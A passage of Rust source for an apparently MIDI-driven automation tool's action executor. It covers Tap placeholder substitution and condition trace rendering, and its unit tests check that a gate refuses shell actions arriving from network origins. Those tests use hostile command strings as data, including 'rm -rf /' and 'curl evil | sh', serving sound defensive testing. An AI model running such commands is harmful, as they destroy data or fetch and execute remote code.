                tracing::debug!(tap.message = %rendered, "Tap action");
                self.routing_trace.push(format!("tap: {rendered}"));
                Ok(DispatchOutcome::Completed)
            }
        }
    }
}

/// Build the `{placeholder, value}` pairs for an ADR-038 `Tap` message from the
/// triggering event's context.
///
/// Parses the raw MIDI bytes: NoteOn/NoteOff expose `{note}` + `{velocity}`, CC
/// exposes `{cc}`, and `{value}` is always the last data byte (CC value, or note
/// velocity for 3-byte messages; the single data byte for 2-byte messages such
/// as Program Change `0xC0` or Channel Pressure `0xD0`). When raw bytes are
/// absent, falls back to the context velocity so `{velocity}`/`{value}` still
/// render. Placeholders with no available value are left literal by
/// [`crate::midi_template::substitute`].
fn tap_substitution_pairs(context: Option<&TriggerContext>) -> Vec<(&'static str, u8)> {
    let mut pairs: Vec<(&'static str, u8)> = Vec::new();
    let Some(ctx) = context else {
        return pairs;
    };
    if let Some(raw) = ctx.raw_midi.as_ref() {
        if raw.len() >= 3 {
            let (status, d1, d2) = (raw[0] & 0xF0, raw[1], raw[2]);
            match status {
                0x90 | 0x80 => {
                    pairs.push(("{note}", d1));
                    pairs.push(("{velocity}", d2));
                    pairs.push(("{value}", d2));
                }
                0xB0 => {
                    pairs.push(("{cc}", d1));
                    pairs.push(("{value}", d2));
                }
                _ => pairs.push(("{value}", d2)),
            }
            return pairs;
        } else if raw.len() >= 2 {
            // 2-byte MIDI messages (e.g. Program Change 0xC0, Channel
            // Pressure 0xD0): the single data byte is {value}.
            pairs.push(("{value}", raw[1]));
            return pairs;
        }
    }
    if let Some(v) = ctx.velocity {
        pairs.push(("{velocity}", v));
        pairs.push(("{value}", v));
    }
    pairs
}

/// ADR-025 Phase 3.A — render a human-readable breadcrumb for a
/// matched state-bearing condition. Used by the Conditional arm of
/// `ActionExecutor::execute` so lowered PcContextSwitch /
/// CcContextSwitch configs (≤MAX_LINEAR_BRANCHES branches, which
/// collapse to a nested `Conditional` chain) emit the same "via …"
/// trace as the `ContextSwitchTable` fast path.
///
/// Returns `None` for non-state conditions (Always, Never, TimeRange,
/// composites, etc.) — those don't correspond to a route the user
/// would want to see in the Events panel.
fn routing_trace_from_condition(cond: &conductor_core::Condition) -> Option<String> {
    use conductor_core::Condition;
    match cond {
        Condition::ActivePcIs {
            pc,
            channel,
            device,
        } => Some(format!(
            "PC {pc} on {device} ch{}",
            channel.saturating_add(1),
        )),
        Condition::CcValueInRange {
            cc,
            channel,
            min,
            max,
            device,
        } => Some(format!(
            "CC {cc} ∈ [{min}, {max}] on {device} ch{}",
            channel.saturating_add(1),
        )),
        Condition::CcIsOn {
            cc,
            channel,
            device,
        } => Some(format!(
            "CC {cc} ≥ 64 on {device} ch{}",
            channel.saturating_add(1),
        )),
        Condition::CcIsOff {
            cc,
            channel,
            device,
        } => Some(format!(
            "CC {cc} ≤ 63 on {device} ch{}",
            channel.saturating_add(1),
        )),
        Condition::NoteHeld {
            note,
            channel,
            device,
            ..
        } => Some(format!(
            "Note {note} held on {device} ch{}",
            channel.saturating_add(1),
        )),
        // Non-state conditions — nothing worth annotating on the
        // Events row. Composite And/Or/Not intentionally skipped at
        // this layer; if a future change wants to trace the first
        // matched leaf in a composite, this is the extension point.
        Condition::Always
        | Condition::Never
        | Condition::TimeRange { .. }
        | Condition::DayOfWeek { .. }
        | Condition::AppRunning { .. }
        | Condition::AppFrontmost { .. }
        | Condition::ModeIs { .. }
        | Condition::And { .. }
        | Condition::Or { .. }
        | Condition::Not { .. } => None,
    }
}

/// Shared test helpers for the `action_executor` submodule tests.
///
/// `test_executor()` is used by tests in several submodules (shell,
/// launch) plus the dispatch-level tests below. Exposing it via a
/// `pub(crate)` test-only module lets each submodule import the same
/// constructor without duplicating it.
#[cfg(test)]
pub(crate) mod test_support {
    use super::*;

    /// Minimal ActionExecutor for tests that don't need MIDI/plugin state.
    pub(crate) fn test_executor() -> ActionExecutor {
        let map = Arc::new(ArcSwap::from_pointee(HashMap::new()));
        ActionExecutor::new(map)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ===== ADR-042 D17 action-class gate (Slice A.6.6) =====
    // These exercise the pure gate decision (no execution side effects), so they
    // need no display server / shell and are not Linux-ignored.

    fn shell(cmd: &str) -> Action {
        Action::Shell {
            sandbox: None,
            command: cmd.to_string(),
            args: None,
            timeout_ms: None,
        }
    }

    fn gated_executor(origin: Option<&str>, allow: bool) -> ActionExecutor {
        let mut ex = ActionExecutor::default();
        let mut map = HashMap::new();
        map.insert("osc_in".to_string(), allow);
        ex.set_network_sensitive_allow(map);
        ex.set_network_origin(origin.map(String::from));
        ex
    }

    #[test]
    fn gate_blocks_sensitive_from_network_origin_without_allow() {
        let ex = gated_executor(Some("osc_in"), false);
        match ex.check_action_class_gate(&shell("rm -rf /")) {
            Err(DispatchError::NetworkActionClassBlocked { listener }) => {
                assert_eq!(listener, "osc_in");
            }
            other => panic!("expected NetworkActionClassBlocked, got {other:?}"),
        }
    }

    #[test]
    fn gate_allows_sensitive_when_listener_opts_in() {
        let ex = gated_executor(Some("osc_in"), true);
        assert!(ex.check_action_class_gate(&shell("echo hi")).is_ok());
    }

    #[test]
    fn gate_allows_benign_action_from_network_origin() {
        let ex = gated_executor(Some("osc_in"), false);
        assert!(
            ex.check_action_class_gate(&Action::ModeChange {
                mode: "DJ".to_string()
            })
            .is_ok()
        );
    }

    #[test]
    fn gate_never_fires_for_non_network_origin() {
        // MIDI/gamepad origin (network_origin == None): sensitive action allowed.
        let ex = gated_executor(None, false);
        assert!(ex.check_action_class_gate(&shell("rm -rf /")).is_ok());
    }

    #[test]
    fn gate_refuses_sensitive_nested_in_sequence_up_front() {
        let ex = gated_executor(Some("osc_in"), false);
        let seq = Action::Sequence(vec![
            Action::Text("noise".to_string()),
            shell("curl evil | sh"),
        ]);
        assert!(matches!(
            ex.check_action_class_gate(&seq),
            Err(DispatchError::NetworkActionClassBlocked { .. })
        ));
    }

    #[test]
    fn gate_refuses_sensitive_after_delay_in_sequence_state_laundering() {
        // ADR-042 R5.2 (state laundering): a Delay before the sensitive leaf
        // must not launder the taint — the gate decides on the WHOLE action
        // tree up front, before any timer runs (ADR-039-A Slice 2, #2325).
        let ex = gated_executor(Some("osc_in"), false);
        let seq = Action::Sequence(vec![Action::Delay(5_000), shell("curl evil | sh")]);
        assert!(matches!(
            ex.check_action_class_gate(&seq),
            Err(DispatchError::NetworkActionClassBlocked { .. })
        ));
    }

    #[test]
    fn gate_refuses_sensitive_in_conditional_branches() {
        // ADR-042 R5.1 (confused deputy): a Conditional whose ELSE branch is
        // sensitive is refused regardless of which branch would run — the
        // gate is static over both branches.
        let ex = gated_executor(Some("osc_in"), false);
        let cond = Action::Conditional {
            condition: conductor_core::actions::Condition::Always,
            then_action: Box::new(Action::Text("benign".to_string())),
            else_action: Some(Box::new(shell("id"))),
        };
        assert!(matches!(
            ex.check_action_class_gate(&cond),
            Err(DispatchError::NetworkActionClassBlocked { .. })
        ));
    }

    #[test]
    fn gate_refuses_sensitive_nested_in_repeat() {
        let ex = gated_executor(Some("osc_in"), false);
        let rep = Action::Repeat {
            action: Box::new(shell("id")),
            count: 3,
            delay_ms: None,
        };
        assert!(matches!(
            ex.check_action_class_gate(&rep),
            Err(DispatchError::NetworkActionClassBlocked { .. })
        ));
    }

    #[test]
    fn gate_unknown_origin_alias_denies_by_default() {
        // network_origin set to an alias absent from the allow map → deny.
        let mut ex = ActionExecutor::default();
        ex.set_network_sensitive_allow(HashMap::new());
        ex.set_network_origin(Some("ghost".to_string()));
        assert!(matches!(
            ex.check_action_class_gate(&shell("id")),
            Err(DispatchError::NetworkActionClassBlocked { .. })
        ));
    }

    // ========== DispatchResult Tests (v4.25.0 - ADR-009 Gap 1) ==========

    #[test]
    #[cfg_attr(target_os = "linux", ignore)] // Enigo requires display server
    fn test_mode_change_returns_mode_change_requested() {
        let mut executor = ActionExecutor::default();

        let action = conductor_core::Action::ModeChange {
            mode: "DJ".to_string(),
        };

        let result = executor.execute(action, None);
        assert!(result.is_ok());
        assert_eq!(
            result.unwrap(),
            DispatchOutcome::ModeChangeRequested {
                mode: "DJ".to_string()
            }
        );
    }

    // ── ADR-038 Slice 4: Tap executor ───────────────────────────────
    // Tap is enigo-free, so these run on all platforms (no display server).

    #[test]
    fn tap_substitutes_note_and_velocity_into_routing_trace() {
        let mut executor = ActionExecutor::default();
        let ctx = TriggerContext {
            velocity: Some(100),
            current_mode: None,
            raw_midi: Some(vec![0x90, 60, 100]), // NoteOn note 60 vel 100
            device_id: Some("pads".to_string()),
            input_event: None,
            osc_message: None,
        };
        let action = conductor_core::Action::Tap {
            message: "note {note} vel {velocity}".to_string(),
        };
        let outcome = executor.execute(action, Some(ctx)).expect("Tap completes");
        assert_eq!(
            outcome,
            DispatchOutcome::Completed,
            "Tap lets through (no signal side-effect)"
        );
        assert_eq!(
            executor.take_routing_trace(),
            vec!["tap: note 60 vel 100".to_string()],
            "Tap must emit its substituted message as a routing-trace breadcrumb"
        );
    }

    #[test]
    fn tap_substitutes_cc_and_value() {
        let mut executor = ActionExecutor::default();
        let ctx = TriggerContext {
            velocity: None,
            current_mode: None,
            raw_midi: Some(vec![0xB0, 7, 100]), // CC 7 = 100
            device_id: None,
            input_event: None,
            osc_message: None,
        };
        let action = conductor_core::Action::Tap {
            message: "cc {cc} = {value}".to_string(),
        };
        executor.execute(action, Some(ctx)).expect("Tap completes");
        assert_eq!(
            executor.take_routing_trace(),
            vec!["tap: cc 7 = 100".to_string()]
        );
    }

    #[test]
    fn tap_without_context_leaves_placeholders_literal() {
        let mut executor = ActionExecutor::default();
        let action = conductor_core::Action::Tap {
            message: "note {note}".to_string(),
        };
        executor
            .execute(action, None)
            .expect("Tap completes without context");
        assert_eq!(
            executor.take_routing_trace(),
            vec!["tap: note {note}".to_string()],
            "with no event context, placeholders are left literal (no panic)"
        );
    }

    #[test]
    fn tap_substitutes_value_for_two_byte_midi() {
        // Program Change (0xC0 nn) is 2 bytes; {value} must resolve to the
        // program number even though there is no d2.
        let mut executor = ActionExecutor::default();
        let ctx = TriggerContext {
            velocity: None,
            current_mode: None,
            raw_midi: Some(vec![0xC0, 42]), // Program Change, program 42
            device_id: None,
            input_event: None,
            osc_message: None,
        };
        let action = conductor_core::Action::Tap {
            message: "prog {value}".to_string(),
        };
        executor.execute(action, Some(ctx)).expect("Tap completes");
        assert_eq!(
            executor.take_routing_trace(),
            vec!["tap: prog 42".to_string()],
            "{{value}} must be the single data byte for 2-byte MIDI messages"
        );
    }

    #[test]
    #[cfg_attr(target_os = "linux", ignore)] // Enigo requires display server
    fn test_delay_returns_completed() {
        let mut executor = ActionExecutor::default();

        let action = conductor_core::Action::Delay(1);
        let result = executor.execute(action, None);
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), DispatchOutcome::Completed);
    }

    #[test]
    #[cfg_attr(target_os = "linux", ignore)] // Enigo requires display server
    fn test_sequence_propagates_mode_change() {
        let mut executor = ActionExecutor::default();

        let action = conductor_core::Action::Sequence(vec![
            conductor_core::Action::Delay(1),
            conductor_core::Action::ModeChange {
                mode: "Live".to_string(),
            },
            conductor_core::Action::Delay(1), // Should not execute
        ]);

        let result = executor.execute(action, None);
        assert!(result.is_ok());
        assert_eq!(
            result.unwrap(),
            DispatchOutcome::ModeChangeRequested {
                mode: "Live".to_string()
            }
        );
    }

    #[test]
    #[cfg_attr(target_os = "linux", ignore)] // Enigo requires display server
    fn test_conditional_propagates_mode_change() {
        let mut executor = ActionExecutor::default();

        let action = conductor_core::Action::Conditional {
            condition: conductor_core::Condition::Always,
            then_action: Box::new(conductor_core::Action::ModeChange {
                mode: "Edit".to_string(),
            }),
            else_action: None,
        };

        let result = executor.execute(action, None);
        assert!(result.is_ok());
        assert_eq!(
            result.unwrap(),
            DispatchOutcome::ModeChangeRequested {
                mode: "Edit".to_string()
            }
        );
    }

    // ADR-025 Phase 2: state conditions evaluated through the executor.
    // Verifies the full plumbing: store attached via with_control_state,
    // Conditional action dispatch builds a ConditionContext carrying the
    // store, and the condition reads through to live state.
    #[test]
    #[cfg_attr(target_os = "linux", ignore)] // Enigo requires display server
    fn test_conditional_active_pc_is_matches_through_executor() {
        use conductor_core::control_state::PhysicalControlStateStore;
        use conductor_core::event_processor::MidiEvent;
        use std::time::Instant;

        let store = Arc::new(PhysicalControlStateStore::default());
        store.observe_event(
            "fcb1010",
            &MidiEvent::ProgramChange {
                program: 12,
                channel: 0,
                time: Instant::now(),
            },
        );

        let mut executor = ActionExecutor::default().with_control_state(Arc::clone(&store));

        // Condition matches → ModeChange fires.
        let action = conductor_core::Action::Conditional {
            condition: conductor_core::Condition::ActivePcIs {
                pc: 12,
                channel: 0,
                device: "fcb1010".into(),
            },
            then_action: Box::new(conductor_core::Action::ModeChange {
                mode: "Lead".to_string(),
            }),
            else_action: None,
        };

        let result = executor.execute(action, None).unwrap();
        assert_eq!(
            result,
            DispatchOutcome::ModeChangeRequested {
                mode: "Lead".to_string()
            }
        );
    }

    #[test]
    #[cfg_attr(target_os = "linux", ignore)] // Enigo requires display server
    fn test_conditional_active_pc_is_falls_through_to_else_when_no_state() {
        // Executor has no store attached — state condition evaluates false,
        // so the else branch must fire. Regression gate: confirms we don't
        // panic and we don't short-circuit to then by accident.
        let mut executor = ActionExecutor::default();

        let action = conductor_core::Action::Conditional {
            condition: conductor_core::Condition::ActivePcIs {
                pc: 12,
                channel: 0,
                device: "fcb1010".into(),
            },
            then_action: Box::new(conductor_core::Action::Delay(1)),
            else_action: Some(Box::new(conductor_core::Action::ModeChange {
                mode: "Fallback".to_string(),
            })),
        };

        let result = executor.execute(action, None).unwrap();
        assert_eq!(
            result,
            DispatchOutcome::ModeChangeRequested {
                mode: "Fallback".to_string()
            }
        );
    }

    #[test]
    #[cfg_attr(target_os = "linux", ignore)] // Enigo requires display server
    fn test_conditional_else_propagates_mode_change() {
        let mut executor = ActionExecutor::default();

        let action = conductor_core::Action::Conditional {
            condition: conductor_core::Condition::Never,
            then_action: Box::new(conductor_core::Action::Delay(1)),
            else_action: Some(Box::new(conductor_core::Action::ModeChange {
                mode: "Mixer".to_string(),
            })),
        };

        let result = executor.execute(action, None);
        assert!(result.is_ok());
        assert_eq!(
            result.unwrap(),
            DispatchOutcome::ModeChangeRequested {
                mode: "Mixer".to_string()
            }
        );
    }

    #[test]
    #[cfg_attr(target_os = "linux", ignore)] // Enigo requires display server
    fn test_repeat_propagates_mode_change() {
        let mut executor = ActionExecutor::default();

        let action = conductor_core::Action::Repeat {
            action: Box::new(conductor_core::Action::ModeChange {
                mode: "Performance".to_string(),
            }),
            count: 3,
            delay_ms: None,
        };

        let result = executor.execute(action, None);
        assert!(result.is_ok());
        // ModeChange should propagate on first iteration
        assert_eq!(
            result.unwrap(),
            DispatchOutcome::ModeChangeRequested {
                mode: "Performance".to_string()
            }
        );
    }

    // ========== ADR-021 Phase 2A: Output Resolution Tests ==========

    #[test]
    fn test_resolve_output_port_alias_hit() {
        let map = Arc::new(ArcSwap::from_pointee(HashMap::from([(
            "mikro".to_string(),
            "Maschine Mikro MK3 Output".to_string(),
        )])));
        let executor = ActionExecutor::new(map);
        assert_eq!(
            executor.resolve_output_port("mikro"),
            "Maschine Mikro MK3 Output"
        );
    }

    #[test]
    fn test_resolve_output_port_raw_fallback() {
        let map = Arc::new(ArcSwap::from_pointee(HashMap::new()));
        let executor = ActionExecutor::new(map);
        assert_eq!(executor.resolve_output_port("IAC Bus 1"), "IAC Bus 1");
    }

    #[test]
    fn test_resolve_source_output_found() {
        let map = Arc::new(ArcSwap::from_pointee(HashMap::from([(
            "synth".to_string(),
            "Synth Controller Output".to_string(),
        )])));
        let executor = ActionExecutor::new(map);
        assert_eq!(
            executor.resolve_source_output("synth").unwrap(),
            "Synth Controller Output"
        );
    }

    #[test]
    fn test_resolve_source_output_not_found() {
        let map = Arc::new(ArcSwap::from_pointee(HashMap::new()));
        let executor = ActionExecutor::new(map);
        let err = executor.resolve_source_output("unknown_device");
        assert!(err.is_err());
        if let Err(DispatchError::TargetNotBound(msg)) = err {
            assert!(msg.contains("unknown_device"));
        } else {
            panic!("Expected TargetNotBound error");
        }
    }

    #[test]
    fn test_output_map_update() {
        let map = Arc::new(ArcSwap::from_pointee(HashMap::new()));
        let executor = ActionExecutor::new(Arc::clone(&map));

        // Initially empty — falls back to raw name
        assert_eq!(executor.resolve_output_port("mikro"), "mikro");

        // Update the shared map
        map.store(Arc::new(HashMap::from([(
            "mikro".to_string(),
            "Mikro Output".to_string(),
        )])));

        // Now resolves to the mapped port
        assert_eq!(executor.resolve_output_port("mikro"), "Mikro Output");
    }

    #[test]
    fn test_existing_raw_port_usage_unchanged() {
        // SendMidi with a raw port name (not an alias) should pass through unchanged
        let map = Arc::new(ArcSwap::from_pointee(HashMap::from([(
            "mikro".to_string(),
            "Mikro Output".to_string(),
        )])));
        let executor = ActionExecutor::new(map);

        // "IAC Bus 1" is not in the map — should fall through as raw port name
        assert_eq!(executor.resolve_output_port("IAC Bus 1"), "IAC Bus 1");
    }
}
